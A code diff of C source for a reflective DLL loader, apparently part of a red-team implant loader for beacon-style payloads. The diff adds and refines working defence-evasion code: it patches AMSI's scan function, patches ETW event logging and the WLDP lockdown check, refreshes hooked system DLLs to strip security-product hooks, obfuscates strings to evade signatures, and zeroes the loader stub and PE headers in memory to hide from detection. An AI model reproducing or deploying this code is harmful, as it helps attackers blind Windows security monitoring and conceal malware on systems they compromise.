@@ -31,10 +31,6 @@
 #define REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR
 #define REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN
 
-// void dprintf(const char*, ...);
-#define dprintf
-
-
 typedef void(__cdecl* FREE)(void*);
 typedef void(__cdecl* __MOVSB)(unsigned char*, unsigned const char*, size_t);
 typedef void* (__cdecl* CALLOC)(size_t, size_t);
@@ -138,6 +134,8 @@ DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader( VOID )
     ULONG_PTR uiValueD;
     ULONG_PTR uiValueE;
 
+    DWORD oldProt = 0;
+
     // STEP 0: calculate our images current base address
 
     // we will start searching backwards from our callers return address.
@@ -230,7 +228,7 @@ DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader( VOID )
             uiNameOrdinals = ( uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfNameOrdinals );
 
             // Number of imports to resolve
-            usCounter = 5;
+            usCounter = 4;
 
             // loop while we still have imports to find
             while( usCounter > 0 )
@@ -239,8 +237,10 @@ DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader( VOID )
                 dwHashValue = hash( (char *)( uiBaseAddress + DEREF_32( uiNameArray ) )  );
                 
                 // if we have found a function we want we get its virtual address
-                if( dwHashValue == LOADLIBRARYA_HASH || dwHashValue == GETPROCADDRESS_HASH || dwHashValue == VIRTUALALLOC_HASH ||
-                    dwHashValue == VIRTUALPROTECT_HASH || dwHashValue == OUTPUTDEBUG_HASH
+                if( dwHashValue == LOADLIBRARYA_HASH 
+                    || dwHashValue == GETPROCADDRESS_HASH 
+                    || dwHashValue == VIRTUALALLOC_HASH 
+                    || dwHashValue == VIRTUALPROTECT_HASH
                 )
                 {
                     // get the VA for the array of addresses
@@ -250,16 +250,14 @@ DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader( VOID )
                     uiAddressArray += ( DEREF_16( uiNameOrdinals ) * sizeof(DWORD) );
 
                     // store this functions VA
-                    if( dwHashValue == LOADLIBRARYA_HASH )
-                        pLoadLibraryA = (LOADLIBRARYA)( uiBaseAddress + DEREF_32( uiAddressArray ) );
-                    else if( dwHashValue == GETPROCADDRESS_HASH )
-                        pGetProcAddress = (GETPROCADDRESS)( uiBaseAddress + DEREF_32( uiAddressArray ) );
-                    else if( dwHashValue == VIRTUALALLOC_HASH )
+                    if (dwHashValue == LOADLIBRARYA_HASH)
+                        pLoadLibraryA = (LOADLIBRARYA)(uiBaseAddress + DEREF_32(uiAddressArray));
+                    else if (dwHashValue == GETPROCADDRESS_HASH)
+                        pGetProcAddress = (GETPROCADDRESS)(uiBaseAddress + DEREF_32(uiAddressArray));
+                    else if (dwHashValue == VIRTUALALLOC_HASH)
                         pVirtualAlloc = (VIRTUALALLOC)(uiBaseAddress + DEREF_32(uiAddressArray));
                     else if (dwHashValue == VIRTUALPROTECT_HASH)
                         pVirtualProtect = (VIRTUALPROTECT)(uiBaseAddress + DEREF_32(uiAddressArray));
-                    else if (dwHashValue == OUTPUTDEBUG_HASH)
-                        pOutputDebugString = (OUTPUTDEBUGSTR)(uiBaseAddress + DEREF_32(uiAddressArray));
             
                     // decrement our counter
                     usCounter--;
@@ -340,7 +338,7 @@ DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader( VOID )
 
     // allocate all the memory for the DLL to be loaded into. we can load at any address because we will  
     // relocate the image. Also zeros all memory and marks it as READ, WRITE and EXECUTE to avoid any problems.
-    uiBaseAddress = (ULONG_PTR)pVirtualAlloc( NULL, ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfImage, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );
+    uiBaseAddress = (ULONG_PTR)pVirtualAlloc( NULL, ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfImage, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE );
 
     // we must now copy over the headers
     uiValueA = ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfHeaders;
@@ -522,7 +520,32 @@ DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader( VOID )
     }
 
     //
-    // STEP 6: apply evasion hooks
+    // Step 6: Adjust section permissions
+    //
+
+    // uiValueA = the VA of the first section
+    uiValueA = ((ULONG_PTR) & ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader + ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.SizeOfOptionalHeader);
+
+    uiValueE = ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.NumberOfSections;
+
+    while (uiValueE--)
+    {
+        // uiValueB is the VA for this section
+        uiValueB = (uiBaseAddress + ((PIMAGE_SECTION_HEADER)uiValueA)->VirtualAddress);
+
+        pVirtualProtect(
+            (LPVOID)uiValueB,
+            ((PIMAGE_SECTION_HEADER)uiValueA)->Misc.VirtualSize,
+            translate_protect(((PIMAGE_SECTION_HEADER)uiValueA)->Characteristics),
+            &oldProt
+        );
+
+        // get the VA of the next section
+        uiValueA += sizeof(IMAGE_SECTION_HEADER);
+    }
+
+    //
+    // STEP 7: apply evasion hooks
     //
     // Based on:
     //   - https://modexp.wordpress.com/2019/06/03/disable-amsi-wldp-dotnet/
@@ -533,43 +556,51 @@ DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader( VOID )
         // to make compiler generate registers assignment string's initialization
         // https://gist.github.com/EvanMcBroom/f5b1bc53977865773802d795ade67273
 
-        // 6.1.Modules unhooking / refreshing
+        // 7.1.Modules unhooking / refreshing
         // THIS_VALUE_WILL_BE_REPLACED
         char buf0[] = { 'T', 'H', 'I', 'S', '_', 'V', 'A', 'L', 'U', 'E', '_', 'W', 'I', 'L', 'L', '_', 'B', 'E', '_', 'R', 'E', 'P', 'L', 'A', 'C', 'E', 'D', '\x00' };
-        if (RefreshPE(buf0, pLoadLibraryA, pGetProcAddress))
-        {
-            dprintf("ReflectiveLoader: PE refreshed.");
-        }
+        RefreshPE(buf0, pLoadLibraryA, pGetProcAddress);
 
-        // 6.2. AMSI hook
-        const char buf2[] = {'a', 'm', 's', 'i', '\x00'};
+        // 7.2. AMSI hook
+        const char buf2[] = { 'a', 'm', 's', 'i', '\x00' };
         HMODULE amsi = pLoadLibraryA(buf2);
         if (amsi != NULL) {
-            const char buf3[] = {'A', 'm', 's', 'i', 'S', 'c', 'a', 'n', 'B', 'u', 'f', 'f', 'e', 'r', '\x00'};
+            const char buf3[] = { 'A', 'm', 's', 'i', 'S', 'c', 'a', 'n', 'B', 'u', 'f', 'f', 'e', 'r', '\x00' };
 
             LPVOID pAmsiScanBuffer = pGetProcAddress(amsi, buf3);
 
             if (pAmsiScanBuffer != NULL) {
+                DWORD temp = 0;
 
-                DWORD oldProt = 0, temp = 0;
-                if (pVirtualProtect(pAmsiScanBuffer, AMSISCANBUFFER_PATCH_SIZE, PAGE_EXECUTE_READWRITE, &oldProt))
-                {
-                    const char buf[] = AMSISCANBUFFER_PATCH_BYTES;
-                    for (unsigned int i = 0; i < AMSISCANBUFFER_PATCH_SIZE; i++)
-                    {
-                        ((char*)pAmsiScanBuffer)[i] = buf[i];
+                // Strategy1: Look for `AMSI` constant DWORD used in the code of AmsiScanBuffer:
+                //      AmsiScanBuffer+76:
+                //      .text:0000000180003656 74 5D                jz      short loc_1800036B5
+                //      .text:0000000180003658 48 85 DB             test    rbx, rbx
+                //      .text:000000018000365B 74 58                jz      short loc_1800036B5
+                //      .text:000000018000365D 81 3B 41 4D 53 49    cmp     dword ptr [rbx], 'ISMA'   <====
+                //      .text:0000000180003663 75 50                jnz     short loc_1800036B5
+                //      .text:0000000180003665 48 8B 43 08          mov     rax, [rbx+8]
+
+                for (unsigned int i = 0; i < 300; i++) {
+                    _PHAMSICONTEXT ctx = (_PHAMSICONTEXT) & ((char*)pAmsiScanBuffer)[i];
+
+                    if (ctx->Signature == 0x49534D41 /* 'AMSI' */) {
+                        if (pVirtualProtect(pAmsiScanBuffer, sizeof(ULONG_PTR), PAGE_EXECUTE_READWRITE, &oldProt))
+                        {
+                            // change signature
+                            ctx->Signature++;
+                            pVirtualProtect(pAmsiScanBuffer, sizeof(ULONG_PTR), oldProt, &temp);
+                        }
                     }
-
-                    pVirtualProtect(pAmsiScanBuffer, AMSISCANBUFFER_PATCH_SIZE, oldProt, &temp);
                 }
             }
         }
 
-        // 6.3. ETW hook
-        const char buf4[] = {'n', 't', 'd', 'l', 'l', '\x00'};
+        // 7.3. ETW hook
+        const char buf4[] = { 'n', 't', 'd', 'l', 'l', '\x00' };
         HMODULE ntdll = pLoadLibraryA(buf4);
         if (ntdll != NULL) {
-            const char buf5[] = {'E', 't', 'w', 'E', 'v', 'e', 'n', 't', 'W', 'r', 'i', 't', 'e', '\x00'};
+            const char buf5[] = { 'E', 't', 'w', 'E', 'v', 'e', 'n', 't', 'W', 'r', 'i', 't', 'e', '\x00' };
             LPVOID pEtwEventWrite = pGetProcAddress(ntdll, buf5);
 
             if (pEtwEventWrite != NULL) {
@@ -577,7 +608,7 @@ DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader( VOID )
 
                 if (pVirtualProtect(pEtwEventWrite, ETW_PATCH_SIZE, PAGE_EXECUTE_READWRITE, &oldProt))
                 {
-                    const char buf[] = ETW_PATCH_BYTES ;
+                    const char buf[] = ETW_PATCH_BYTES;
                     for (unsigned int i = 0; i < ETW_PATCH_SIZE; i++)
                     {
                         ((char*)pEtwEventWrite)[i] = buf[i];
@@ -588,14 +619,14 @@ DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader( VOID )
             }
         }
 
-        // 6.4. WLDP (Windows Lockdown Policy) hook
-        const char buf6[] = {'w', 'l', 'd', 'p', '\x00'};
+        // 7.4. WLDP (Windows Lockdown Policy) hook
+        const char buf6[] = { 'w', 'l', 'd', 'p', '\x00' };
         HMODULE wldp = pLoadLibraryA(buf6);
         if (wldp != NULL) {
-            const char buf7[] = {'W', 'l', 'd', 'p', 'Q', 'u', 'e', 'r', 'y', 'D', 'y', 'n', 'a', 'm', 'i', 'c', 'C', 'o', 'd', 'e', 'T', 'r', 'u', 's', 't', '\x00'};
+            const char buf7[] = { 'W', 'l', 'd', 'p', 'Q', 'u', 'e', 'r', 'y', 'D', 'y', 'n', 'a', 'm', 'i', 'c', 'C', 'o', 'd', 'e', 'T', 'r', 'u', 's', 't', '\x00' };
             LPVOID pWldpQueryDynamicCodeTrust = pGetProcAddress(wldp, buf7);
 
-                DWORD oldProt = 0, temp = 0;
+            DWORD oldProt = 0, temp = 0;
 
             if (pWldpQueryDynamicCodeTrust != NULL) {
                 if (pVirtualProtect(pWldpQueryDynamicCodeTrust, ETW_PATCH_SIZE, PAGE_EXECUTE_READWRITE, &oldProt))
@@ -615,13 +646,64 @@ DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader( VOID )
     }
     
 
-    // STEP 7: call our images entry point
+    //
+    // Step 8: Overwrite our ReflectiveLoader stub to lower detection potential.
+    //
+
+    DWORD bytesToOverwrite = 0;
+
+    // Below meaningless if statement is placed here merely to let the further code compute 
+    // number of bytes that should get overwritten.
+    if (uiValueA == 'ABCD') {
+        uiHeaderValue ^= 0xAF;
+    }
+
+    //
+    // Above code will consist of a stream of 0x00 bytes.
+    //
+    // v------------------------------------------------^
+    //
+    // Below code remains intact (not overwritten).
+    //
+
+    const DWORD offset = (((DWORD)((BYTE*)&ReflectiveLoader)) & 0xfff);
+    BYTE* ptr = (BYTE*)&ReflectiveLoader;
+    ptr -= offset;
+
+    while (bytesToOverwrite++ < 6000) {
+        if (*(DWORD*)&ptr[bytesToOverwrite] == 'ABCD') {
+
+            if (pVirtualProtect(ptr, bytesToOverwrite, PAGE_EXECUTE_READWRITE, &oldProt)) {
+
+                //
+                // Overwrites ReflectiveLoader function's bytes up to the above
+                // if (value == 'ABCD') statement.
+                //
+                for (unsigned int i = 0; i < bytesToOverwrite; i++)
+                    *ptr++ = 0;
+
+                pVirtualProtect(ptr, bytesToOverwrite, PAGE_EXECUTE_READ, &oldProt);
+            }
+
+            break;
+        }
+    }
 
     // uiValueA = the VA of our newly loaded DLL/EXE's entry point
-    uiValueA = ( uiBaseAddress + ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.AddressOfEntryPoint );
+    uiValueA = (uiBaseAddress + ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.AddressOfEntryPoint);
+
+    uiValueB = ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfHeaders;
+    uiValueC = uiBaseAddress;
+
+    // Finally, wipe PE headers residing on the beginning of the allocation with
+    // this Reflective Loader.
+    while (uiValueB--)
+        *(BYTE*)uiValueC++ = 0;
+
+    // STEP 9: call our images entry point
 
     // We must flush the instruction cache to avoid stale code being used which was updated by our relocation processing.
-    pNtFlushInstructionCache( (HANDLE)-1, NULL, 0 );
+    pNtFlushInstructionCache((HANDLE)-1, NULL, 0);
 
     // call our respective entry point, fudging our hInstance value
 #ifdef REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR
@@ -838,168 +920,144 @@ __forceinline BOOL ResolveOwnImports(struct FunctionPointers* fptrs, LOADLIBRARY
     char buf0[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '\x00' };
     HMODULE hKernel32 = pLoadLibraryA(buf0);
     if (!hKernel32) {
-        dprintf("ResolveOwnImports: could not load kernel32");
         return FALSE;
     }
 
     char buf01[] = { 'm', 's', 'v', 'c', 'r', 't', '\x00' };
     HMODULE hMsvcrt = pLoadLibraryA(buf01);
     if (!hMsvcrt) {
-        dprintf("ResolveOwnImports: could not load msvcrt");
         return FALSE;
     }
 
     char buf1[] = { 'f', 'r', 'e', 'e', '\x00' };
     fptrs->pfree = (FREE)pGetProcAddress(hMsvcrt, buf1);
     if (!fptrs->pfree) {
-        dprintf("ResolveOwnImports failed: free");
         return FALSE;
     }
 
     /*char buf2[] = { '_', '_', 'm', 'o', 'v', 's', 'b', '\x00' };
     __MOVSB __movsb = (__MOVSB)pGetProcAddress(hKernel32, buf2);
     if (!__movsb) {
-        dprintf("ResolveOwnImports failed: __movsb");
         return FALSE;
     }*/
 
     char buf3[] = { 'c', 'a', 'l', 'l', 'o', 'c', '\x00' };
     fptrs->pcalloc = (CALLOC)pGetProcAddress(hMsvcrt, buf3);
     if (!fptrs->pcalloc) {
-        dprintf("ResolveOwnImports failed: calloc");
         return FALSE;
     }
 
     char buf4[] = { 'm', 'b', 's', 't', 'o', 'w', 'c', 's', '_', 's', '\x00' };
     fptrs->pmbstowcs_s = (MBSTOWCS_S)pGetProcAddress(hMsvcrt, buf4);
     if (!fptrs->pmbstowcs_s) {
-        dprintf("ResolveOwnImports failed: mbstowcs_s");
         return FALSE;
     }
 
     char buf5[] = { '_', 'w', 'c', 's', 'n', 'i', 'c', 'm', 'p', '\x00' };
     fptrs->p_wcsnicmp = (_WCSNICMP)pGetProcAddress(hMsvcrt, buf5);
     if (!fptrs->p_wcsnicmp) {
-        dprintf("ResolveOwnImports failed: _wcsnicmp");
         return FALSE;
     }
 
     char buf6[] = { 's', 't', 'r', 'l', 'e', 'n', '\x00' };
     fptrs->pstrlen = (STRLEN)pGetProcAddress(hMsvcrt, buf6);
     if (!fptrs->pstrlen) {
-        dprintf("ResolveOwnImports failed: strlen");
         return FALSE;
     }
 
     char buf7[] = { 's', 't', 'r', 'c', 'm', 'p', '\x00' };
     fptrs->pstrcmp = (STRCMP)pGetProcAddress(hMsvcrt, buf7);
     if (!fptrs->pstrcmp) {
-        dprintf("ResolveOwnImports failed: strcmp");
         return FALSE;
     }
 
     char buf8[] = { 'w', 'c', 's', 'c', 'm', 'p', '\x00' };
     fptrs->pwcscmp = (WCSCMP)pGetProcAddress(hMsvcrt, buf8);
     if (!fptrs->pwcscmp) {
-        dprintf("ResolveOwnImports failed: wcscmp");
         return FALSE;
     }
 
     char buf9[] = { 'm', 'e', 'm', 'c', 'm', 'p', '\x00' };
     fptrs->pmemcmp = (MEMCMP)pGetProcAddress(hMsvcrt, buf9);
     if (!fptrs->pmemcmp) {
-        dprintf("ResolveOwnImports failed: memcmp");
         return FALSE;
     }
 
     char buf10[] = { 's', 't', 'r', 's', 't', 'r', '\x00' };
     fptrs->pstrstr = (STRSTR)pGetProcAddress(hMsvcrt, buf10);
     if (!fptrs->pstrstr) {
-        dprintf("ResolveOwnImports failed: strstr");
         return FALSE;
     }
 
     char buf11[] = { 's', 't', 'r', 'n', 'l', 'e', 'n', '\x00' };
     fptrs->pstrnlen = (STRNLEN)pGetProcAddress(hMsvcrt, buf11);
     if (!fptrs->pstrnlen) {
-        dprintf("ResolveOwnImports failed: strnlen");
         return FALSE;
     }
 
     char buf12[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'F', 'r', 'e', 'e', '\x00' };
     fptrs->pVirtualFree = (VIRTUALFREE)pGetProcAddress(hKernel32, buf12);
     if (!fptrs->pVirtualFree) {
-        dprintf("ResolveOwnImports failed: VirtualFree");
         return FALSE;
     }
 
     char buf13[] = { 'C', 'r', 'e', 'a', 't', 'e', 'F', 'i', 'l', 'e', 'W', '\x00' };
     fptrs->pCreateFileW = (CREATEFILEW)pGetProcAddress(hKernel32, buf13);
     if (!fptrs->pCreateFileW) {
-        dprintf("ResolveOwnImports failed: CreateFileW");
         return FALSE;
     }
 
     char buf14[] = { 'C', 'r', 'e', 'a', 't', 'e', 'F', 'i', 'l', 'e', 'M', 'a', 'p', 'p', 'i', 'n', 'g', 'W', '\x00' };
     fptrs->pCreateFileMappingW = (CREATEFILEMAPPINGW)pGetProcAddress(hKernel32, buf14);
     if (!fptrs->pCreateFileMappingW) {
-        dprintf("ResolveOwnImports failed: CreateFileMappingW");
         return FALSE;
     }
 
     char buf15[] = { 'M', 'a', 'p', 'V', 'i', 'e', 'w', 'O', 'f', 'F', 'i', 'l', 'e', '\x00' };
     fptrs->pMapViewOfFile = (MAPVIEWOFFILE)pGetProcAddress(hKernel32, buf15);
     if (!fptrs->pMapViewOfFile) {
-        dprintf("ResolveOwnImports failed: MapViewOfFile");
         return FALSE;
     }
 
     char buf16[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', '\x00' };
     fptrs->pVirtualAlloc = (VIRTUALALLOC)pGetProcAddress(hKernel32, buf16);
     if (!fptrs->pVirtualAlloc) {
-        dprintf("ResolveOwnImports failed: VirtualAlloc");
         return FALSE;
     }
 
     char buf17[] = { 'U', 'n', 'm', 'a', 'p', 'V', 'i', 'e', 'w', 'O', 'f', 'F', 'i', 'l', 'e', '\x00' };
     fptrs->pUnmapViewOfFile = (UNMAPVIEWOFFILE)pGetProcAddress(hKernel32, buf17);
     if (!fptrs->pUnmapViewOfFile) {
-        dprintf("ResolveOwnImports failed: UnmapViewOfFile");
         return FALSE;
     }
 
     char buf18[] = { 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', '\x00' };
     fptrs->pCloseHandle = (CLOSEHANDLE)pGetProcAddress(hKernel32, buf18);
     if (!fptrs->pCloseHandle) {
-        dprintf("ResolveOwnImports failed: CloseHandle");
         return FALSE;
     }
 
     char buf19[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'W', '\x00' };
     fptrs->pLoadLibraryW = (LOADLIBRARYW)pGetProcAddress(hKernel32, buf19);
     if (!fptrs->pLoadLibraryW) {
-        dprintf("ResolveOwnImports failed: LoadLibraryW");
         return FALSE;
     }
 
     char buf20[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', '\x00' };
     fptrs->pVirtualProtect = (VIRTUALPROTECT)pGetProcAddress(hKernel32, buf20);
     if (!fptrs->pVirtualProtect) {
-        dprintf("ResolveOwnImports failed: VirtualProtect");
         return FALSE;
     }
 
     char buf21[] = { 'G', 'e', 't', 'M', 'o', 'd', 'u', 'l', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 'W', '\x00' };
     fptrs->pGetModuleHandleW = (GETMODULEHANDLEW)pGetProcAddress(hKernel32, buf21);
     if (!fptrs->pGetModuleHandleW) {
-        dprintf("ResolveOwnImports failed: GetModuleHandleW");
         return FALSE;
     }
 
     char buf22[] = { 'O', 'u', 't', 'p', 'u', 't', 'D', 'e', 'b', 'u', 'g', 'S', 't', 'r', 'i', 'n', 'g', 'A', '\x00' };
     fptrs->pOutputDebugStringA = (OUTPUTDEBUGSTR)pGetProcAddress(hKernel32, buf22);
     if (!fptrs->pOutputDebugStringA) {
-        dprintf("ResolveOwnImports failed: OutputDebugStringA");
         return FALSE;
     }
 
@@ -1030,8 +1088,6 @@ __forceinline BOOL RefreshPE(char* stomp, LOADLIBRARYA pLoadLibraryA, GETPROCADD
 
     size_t beaconDllLength = fptrs.pstrlen(stomp);
 
-    dprintf("[REFRESH] Running DLLRefresher");
-
     pLdteHead = GetInMemoryOrderModuleList();
     pLdteCurrent = pLdteHead;
 
@@ -1041,8 +1097,6 @@ __forceinline BOOL RefreshPE(char* stomp, LOADLIBRARYA pLoadLibraryA, GETPROCADD
             wszFullDllName = pLdteCurrent->FullDllName.pBuffer;
             wszBaseDllName = pLdteCurrent->BaseDllName.pBuffer;
             pDllBase = (ULONG_PTR)pLdteCurrent->DllBase;
-
-            dprintf("[REFRESH] Refreshing DLL: %S", wszFullDllName);
 
             hModule = CustomLoadLibrary(&fptrs, wszFullDllName, wszBaseDllName, pDllBase);
 
@@ -1097,10 +1151,10 @@ __forceinline HMODULE CustomLoadLibrary(struct FunctionPointers* fptrs, const PW
     FARPROC* pIatEntry;
 
     // clr.dll hotpatches itself at runtime for performance reasons, so skip it
-    if (fptrs->pwcscmp(L"clr.dll", wszBaseDllName) == 0)
-        goto cleanup;
+    WCHAR buf1[] = {L'c', L'l', L'r', L'.', L'd', L'l', L'l', 0};
 
-    dprintf("[REFRESH] Opening file: %S", wszFullDllName);
+    if (fptrs->pwcscmp(buf1, wszBaseDllName) == 0)
+        goto cleanup;
 
     // ----
     // Step 1: Map the file into memory
@@ -1125,15 +1179,12 @@ __forceinline HMODULE CustomLoadLibrary(struct FunctionPointers* fptrs, const PW
     pNtHeader = (PIMAGE_NT_HEADERS)(pFile + pDosHeader->e_lfanew);
 
     // allocate memory to copy DLL into
-    dprintf("[REFRESH] Allocating memory for library");
     pLibraryAddr = (PCHAR)fptrs->pVirtualAlloc(NULL, pNtHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
     // copy header
-    dprintf("[REFRESH] Copying PE header into memory");
     __movsb((PBYTE)pLibraryAddr, (PBYTE)pFile, pNtHeader->OptionalHeader.SizeOfHeaders);
 
     // copy sections
-    dprintf("[REFRESH] Copying PE sections into memory");
     pSectionHeader = (PIMAGE_SECTION_HEADER)(pFile + pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS));
     for (dwIdx = 0; dwIdx < pNtHeader->FileHeader.NumberOfSections; dwIdx++)
     {
@@ -1149,7 +1200,6 @@ __forceinline HMODULE CustomLoadLibrary(struct FunctionPointers* fptrs, const PW
     // ----
     // Step 3: Calculate relocations
     // ----
-    dprintf("[REFRESH] Calculating file relocations");
 
     pDataDir = &pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
     pInitialImageBase = pNtHeader->OptionalHeader.ImageBase;
@@ -1212,7 +1262,6 @@ __forceinline HMODULE CustomLoadLibrary(struct FunctionPointers* fptrs, const PW
     // ----
     // Step 4: Update import table
     // ----
-    dprintf("[REFRESH] Resolving Import Address Table (IAT) ");
 
     pDataDir = &pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
     if (pDataDir->Size)
@@ -1232,10 +1281,10 @@ __forceinline HMODULE CustomLoadLibrary(struct FunctionPointers* fptrs, const PW
 
             fptrs->pmbstowcs_s(&stSize, wszDllName, stDllName + 1, szDllName, stDllName);
 
-            dprintf("[REFRESH] Loading library: %S from %s", wszDllName, szDllName);
-
             // If the DLL starts with api- or ext-, resolve the redirected name and load it
-            if (fptrs->p_wcsnicmp(wszDllName, L"api-", 4) == 0 || fptrs->p_wcsnicmp(wszDllName, L"ext-", 4) == 0)
+            WCHAR buf2[] = {L'a', L'p', L'i', L'-', 0};
+            WCHAR buf3[] = {L'e', L'x', L't', L'-', 0};
+            if (fptrs->p_wcsnicmp(wszDllName, buf2, 4) == 0 || fptrs->p_wcsnicmp(wszDllName, buf3, 4) == 0)
             {
                 // wsRedir is not null terminated
                 wsRedir = GetRedirectedName(fptrs, wszBaseDllName, wszDllName, &stRedirName);
@@ -1248,7 +1297,6 @@ __forceinline HMODULE CustomLoadLibrary(struct FunctionPointers* fptrs, const PW
                         goto next_import;
 
                     __movsb((PBYTE)wszDllName, (PBYTE)wsRedir, stRedirName * sizeof(WCHAR));
-                    dprintf("[REFRESH] Redirected library: %S", wszDllName);
                 }
             }
 
@@ -1303,8 +1351,6 @@ __forceinline HMODULE CustomGetModuleHandleW(struct FunctionPointers* fptrs, con
     PLDR_DATA_TABLE_ENTRY pLdteHead = NULL;
     PLDR_DATA_TABLE_ENTRY pLdteCurrent = NULL;
 
-    dprintf("[REFRESH] Searching for loaded module: %S", wszModule);
-
     pLdteCurrent = pLdteHead = GetInMemoryOrderModuleList();
 
     do {
@@ -1328,13 +1374,14 @@ __forceinline VOID ScanAndFixModule(struct FunctionPointers* fptrs, PCHAR pKnown
 
     DWORD dwIdx;
 
-    dprintf("[REFRESH] Scanning module: %S", wszBaseDllName);
-
     pDosHeader = (PIMAGE_DOS_HEADER)pKnown;
     pNtHeader = (PIMAGE_NT_HEADERS)(pKnown + pDosHeader->e_lfanew);
 
     // Scan PE header
-    ScanAndFixSection(fptrs, wszBaseDllName, "Header", pKnown, pSuspect, pNtHeader->OptionalHeader.SizeOfHeaders);
+    char buf0[] = {'H', 'e', 'a', 'd', 'e', 'r', 0};
+    char buf2[] = {'.', 't', 'e', 'x', 't', 0};
+    WCHAR buf1[] = {L'c', L'l', L'r', L'.', L'd', L'l', L'l', 0};
+    ScanAndFixSection(fptrs, wszBaseDllName, buf0, pKnown, pSuspect, pNtHeader->OptionalHeader.SizeOfHeaders);
 
     // Scan each section
     pSectionHeader = (PIMAGE_SECTION_HEADER)(pKnown + pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS));
@@ -1343,7 +1390,7 @@ __forceinline VOID ScanAndFixModule(struct FunctionPointers* fptrs, PCHAR pKnown
         if (pSectionHeader[dwIdx].Characteristics & IMAGE_SCN_MEM_WRITE)
             continue;
 
-        if (!((fptrs->pwcscmp(wszBaseDllName, L"clr.dll") == 0 && fptrs->pstrcmp((const char*)pSectionHeader[dwIdx].Name, ".text") == 0)))
+        if (!((fptrs->pwcscmp(wszBaseDllName, buf1) == 0 && fptrs->pstrcmp((const char*)pSectionHeader[dwIdx].Name, buf2) == 0)))
         {
             ScanAndFixSection(fptrs, wszBaseDllName, (PCHAR)pSectionHeader[dwIdx].Name, pKnown + pSectionHeader[dwIdx].VirtualAddress,
                 pSuspect + pSectionHeader[dwIdx].VirtualAddress, pSectionHeader[dwIdx].Misc.VirtualSize);
@@ -1360,11 +1407,9 @@ __forceinline VOID ScanAndFixSection(struct FunctionPointers* fptrs, PWCHAR dll,
         if (!fptrs->pVirtualProtect(pSuspect, stLength, PAGE_EXECUTE_READWRITE, &ddOldProtect))
             return;
 
-        dprintf("[REFRESH] Copying known good section into memory.");
         __movsb((PBYTE)pSuspect, (PBYTE)pKnown, stLength);
 
-        if (!fptrs->pVirtualProtect(pSuspect, stLength, ddOldProtect, &ddOldProtect))
-            dprintf("[REFRESH] Unable to reset memory permissions");
+        fptrs->pVirtualProtect(pSuspect, stLength, ddOldProtect, &ddOldProtect);
     }
 }
 
@@ -1477,7 +1522,8 @@ __forceinline FARPROC WINAPI CustomGetProcAddressEx(struct FunctionPointers* fpt
                     szFwdDesc = (PCHAR)(uiLibraryAddress + uiFuncVA);
 
                     // Find the first character after "."
-                    szRedirFunc = (PCHAR)fptrs->pstrstr(szFwdDesc, ".") + 1;
+                    char buf4[] = {'.', 0};
+                    szRedirFunc = (PCHAR)fptrs->pstrstr(szFwdDesc, buf4) + 1;
                     stDllName = (SIZE_T)(szRedirFunc - szFwdDesc);
 
                     // Allocate enough space to append "dll"
@@ -1485,11 +1531,15 @@ __forceinline FARPROC WINAPI CustomGetProcAddressEx(struct FunctionPointers* fpt
                     if (wszDllName == NULL)
                         break;
 
+                    WCHAR buf1[] = {L'd', L'l', L'l', 0};
                     fptrs->pmbstowcs_s(NULL, wszDllName, stDllName + 1, szFwdDesc, stDllName);
-                    __movsb((PBYTE)(wszDllName + stDllName), (PBYTE)(L"dll"), 3 * sizeof(WCHAR));
+                    __movsb((PBYTE)(wszDllName + stDllName), (PBYTE)(buf1), 3 * sizeof(WCHAR));
 
                     // check for a redirected module name
-                    if (fptrs->p_wcsnicmp(wszDllName, L"api-", 4) == 0 || fptrs->p_wcsnicmp(wszDllName, L"ext-", 4) == 0)
+                    WCHAR buf2[] = {L'a', L'p', L'i', L'-', 0};
+                    WCHAR buf3[] = {L'e', L'x', L't', L'-', 0};
+                    
+                    if (fptrs->p_wcsnicmp(wszDllName, buf2, 4) == 0 || fptrs->p_wcsnicmp(wszDllName, buf3, 4) == 0)
                     {
                         wsRedir = GetRedirectedName(fptrs, wszOriginalModule, wszDllName, &stRedirName);
                         if (wsRedir)
